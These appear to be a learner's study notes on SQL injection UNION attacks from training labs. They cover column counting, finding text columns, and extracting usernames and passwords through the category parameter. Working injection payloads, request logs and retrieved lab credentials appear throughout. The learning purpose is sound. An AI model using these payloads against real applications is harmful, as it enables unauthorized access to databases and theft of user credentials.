# Retrieving data from other database tables

In cases where the results of na SQL query are returned within the application's responses, an attacker can leverage an SQL injection vulnerability to retrieve data from other tables within the database.

UNION keyword could execute additional SELECT query and append the results to the original query.

If an application executes the following query:

``` SELECT name, description FROM products WHERE category = 'Gifts' ```

then an attacker can submit the input:

``` ' UNION SELECT username, password FROM users-- ```

This will cause the application to return all usernames and passwords along with the names and ddescriptions of products.

For a UNION query to work, two key requirements must be met:
- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

## Determining the number of columns required in an SQL injection UNION attack

The first method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs.

``` 
' ORDER BY 1--
' ORDER BY 2--
ETC. 
```

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values.

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
ETC.
```

It says Error = incorrect number of columns or it can says 200 response code = correct number of columns.

### SQL injection UNION attack, determining the number of columns returned by the query

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the *category* parameter, giving it the value ``` '+UNION+SELECT+NULL-- ```. Observe that en error occurs.
3. Modify the *category* parameter to add an additional column containing a null value:
``` '+UNION+SELECT+NULL,NULL--```
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

**My comment**

I need to write behind gifts 'UNION select NULL-- and when I select this and press ctrl+u then it looks like that:

``` GET /filter?category=Tech+gifts'+UNION+select+NULL-- HTTP/1.1               500 Internal Server Error``` 

``` GET /filter?category=Tech+gifts'+UNION+select+NULL,+NULL-- HTTP/1.1         500 Internal Server Error```

```GET /filter?category=Tech+gifts'+UNION+select+NULL,+NULL,+NULL-- HTTP/1.1   200 OK```

Second option is to try in browser and that is write ```' ORDER BY 1```

## Finding columns with a useful data type in an SQL injection UNION attack

Generally, the interesting data that you want to retrieve will be in string form, so you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

This one will find out if the table contains a string:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the data type of a column is not compatible with string data, the injected query will cause a database error.

### SQL injection UNION attack, finding a column containing text

This lab contains an SQL injection vulnerability in the product category filter. 

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the *category* parameter:

    ``` '+UNION+SELECT+NULL,NULL,NULL-- ```

3. Try replacing each null with the random value provided by the lab, for example: 

    ``` '+UNION+SELECT+'abcdef',NULL,NULL--```

4. If an error occurs, move on to the next null and try that instead.

**My comment**

``` ?category=Gifts'+UNION+SELECT+'rn4IRy',null,null--   500 Internal Server Error```

``` ?category=Gifts'+UNION+SELECT+null,'rn4IRy',null--   200 OK```

## Using an SQL injection UNION attack to retrieve interesting data

If I know that the table contains string I can use this query to find a password:

```' UNION SELECT username, password FROM users--```

### SQL injection UNION attack, retrieving data from other tables

This lab contains an SQL injection vulnerability in the product category filter.

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

    ``` '+UNION+SELECT+'abc','def'-- ```

3. Use the following payload to retrieve the contents of the *user* table:

    ``` '+UNION+SELECT+username,+password+FROM+users-- ```

4. Verify that the application's response contains usernames and passwords.

**My comment**

``` ?category=Pets'+UNION+SELECT+username,password+FROM+users--```

## Retrieving multiple values within a single column

Multiple values can be easily retrieve together within single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values.

``` ' UNION SELECT username || '~' || password FROM users--```

The result from the query: administrator~s3cure

### SQL injection UNION attack, retrieving multiple values in a single column

This lab contains an SQL injection vulnerability in the product category filter. 

**Solution**
1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the *category* parameter:

    ``` '+UNION+SELECT+NULL,'abc'--```

3. Use the following payload to retrieve the contents of the users table:

    ```'UNION SELECT NULL, username || '~' || password FROM users--```

4. Verify that the application's response contains usernames and passwords.

Credentials retrieved: administrator~5v82nt